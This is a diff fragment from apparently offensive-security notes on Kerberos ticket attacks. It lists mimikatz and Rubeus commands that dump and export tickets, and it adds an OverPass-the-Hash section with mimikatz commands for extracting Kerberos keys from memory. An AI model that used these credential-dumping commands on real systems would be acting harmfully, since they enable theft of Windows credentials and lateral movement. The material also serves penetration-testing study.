@@ -13,3 +13,12 @@ sekurlsa::tickets /export
 ```
 Rubeus.exe dump /nowrap
 ```
+
+In addition, we can perform OverPass the Hash attack with user's NTLM password hash, that is, we convert the user's ntlm hash into a full TGT for our usage
+
+First we need to extract Kerboros Keys by using mimikatz:
+```
+mimikatz.exe
+privilege::debug
+sekurlsa::el
+```
